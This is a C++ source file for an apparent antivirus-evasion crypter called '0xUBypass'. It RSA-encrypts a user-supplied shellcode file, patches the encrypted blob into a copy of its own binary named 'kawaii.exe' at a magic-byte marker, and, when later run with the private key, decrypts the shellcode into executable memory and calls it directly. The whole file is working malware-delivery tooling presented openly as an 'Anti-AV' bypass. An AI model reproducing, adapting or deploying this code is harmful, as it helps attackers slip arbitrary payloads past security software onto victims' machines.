#include<iostream>
#include<fstream>
#include"Utils.h"
#include"RSA.h"
#include"WindowsShellcodeInjector.h"

using namespace std;

#define MAX_ENCRYPT_SHELLCODE 4096
#define MAX_SHELLCODE 2048

#define MAGIC 0xff, 0xff, 0xdd, 0x11, 0x99, 0x10

struct ShellCode {
	uint8_t shellcode[MAX_ENCRYPT_SHELLCODE] = { 
		MAGIC
	};
	uint32_t shellcode_size = 0;
	uint32_t shellcode_real_size = 0;
};

ShellCode shellcode;

int seeking(char *src, int size, char *magic, int msize) {
	int result = -1;

	for (int pos = 0; pos < size - msize; pos++) {
		bool success = true;
		for (int i = 0; i < msize; i++) {
			if (src[pos + i] != magic[i]) {
				success = false;
				break;
			}
		}
		if (success) {
			return pos;
		}
	}
	return result;
}

int en(int argc, char **argv) {
	if (argc != 2) {
		cout << "Usage: 0xUBypass.exe [shellcode_path]" << endl
			<< "shellcode_path is a relative path to the binary file contains all your shellcode";
		return -1;
	}

	string public_key, private_key;
	GenerateKey(public_key, private_key);

	cout << "[*] Generated Private Key => " << private_key << endl;

	ifstream input_shellcode(string("./") + argv[1], ios::in | ios::binary);
	if (!input_shellcode.is_open()) {
		cout << "Failed - Make sure your shellcode file exists and readable" << endl;
		return -1;
	}

	uint8_t tmp_shell[MAX_SHELLCODE] = { 0 };
	input_shellcode.read((char *)tmp_shell, MAX_SHELLCODE);
	size_t size = input_shellcode.gcount();
	if (size <= 0) {
		cout << "Failed - Empty shellcode file or an unexpected error occurred" << endl;
		return -1;
	}
	
	//padding to ENCRYPT_BLOCK_SIZE
	size = CEIL(size, (ENCRYPT_BLOCK_SIZE / 8)) * (ENCRYPT_BLOCK_SIZE / 8);

	cout << "[*] Your Padding Original Shellcode Size is " << size << endl;
	cout << "[*] Your Padding Encrypted Shellcode Size is " << NEEDED_ENCRYPT_LENGTH(size) << endl;
	//encrypt
	EncryptShell(tmp_shell, size, shellcode.shellcode, NEEDED_ENCRYPT_LENGTH(size), public_key);

	cout << "[*] Your Encrypted Shellcode is ";
	for (int i = 0; i < NEEDED_ENCRYPT_LENGTH(size); i++) {
		printf("%02x", shellcode.shellcode[i]);
	}
	cout << endl;

	//remove old
	remove("kawaii.exe");
	cout << "[*] Removed old binary file" << endl;

	//copy self
	ifstream exec(argv[0], ios::in | ios::binary);
	ofstream patched("kawaii.exe", ios::out | ios::binary);

	uint8_t magic_number[] = {
		MAGIC
	};

	uint8_t *buffer = (uint8_t *)malloc(1024 * 1024);
	memset(buffer, 0, sizeof(buffer));
	exec.read((char *)buffer, 1024 * 1024);
	int p = seeking((char *)buffer, exec.gcount(), (char *)magic_number, sizeof(magic_number));
	if (p >= 0) {
		for (int i = 0; i < NEEDED_ENCRYPT_LENGTH(size); i++) {
			buffer[i + p] = shellcode.shellcode[i];
		}
		size_t en_size = NEEDED_ENCRYPT_LENGTH(size);
		size_t de_size = size;
		for (int i = 0; i < 4; i++) {
			buffer[p + MAX_ENCRYPT_SHELLCODE + i] = (en_size & 0xff);
			en_size >>= 8;
		}

		for (int i = 0; i < 4; i++) {
			buffer[p + MAX_ENCRYPT_SHELLCODE + 4 + i] = (de_size & 0xff);
			de_size >>= 8;
		}
	}

	patched.write((char *)buffer, exec.gcount());

	cout << endl << "[*] Generated Anti-AV binary file => kawaii.exe" << endl;
	cout << "[*] Usage Command => kawaii.exe " << " '" << private_key << "'" << endl;

	patched.close();
	exec.close();

	free(buffer);
	return 0;
}

int de(int argc, char **argv) {
	if (argc != 2) {
		return 0;
	}
	string key = argv[1];
	
	WindowsShellCodeInvoke invoker;
	LPVOID shell_mem = invoker.VirtualAllocMemory(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	DecryptShell(shellcode.shellcode, shellcode.shellcode_size, (uint8_t *)shell_mem, shellcode.shellcode_real_size, key);

	typedef void(*fptr)();
	((fptr)shell_mem)();

	return 0;
}

int main(int argc, char **argv) {
	if (shellcode.shellcode_size != 0) {
		return de(argc, argv);
	}
	return en(argc, argv);
}